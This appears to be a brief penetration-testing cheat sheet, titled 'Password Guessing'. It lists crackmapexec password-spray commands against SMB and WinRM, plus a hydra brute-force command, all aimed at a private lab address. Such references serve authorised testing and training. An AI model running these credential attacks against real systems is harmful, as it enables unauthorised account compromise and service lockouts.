# Password Guessing



### SMB

**Password spray** a list of usernames against a domain controller.

{% code overflow="wrap" %}
```sh
crackmapexec smb 192.168.219.122 -u ./users.txt -p ./passwords.txt --continue-on-success
```
{% endcode %}

Brute force usernames and passwords:

```sh
hydra -L users.txt -P passwords.txt smb://192.168.219.122
```



### WinRM

Spray passwords against WinRM service on the domain controller:

{% code overflow="wrap" %}
```sh
crackmapexec winrm 192.168.219.122 -u ./users.txt -p ./passwords.txt --continue-on-success
```
{% endcode %}



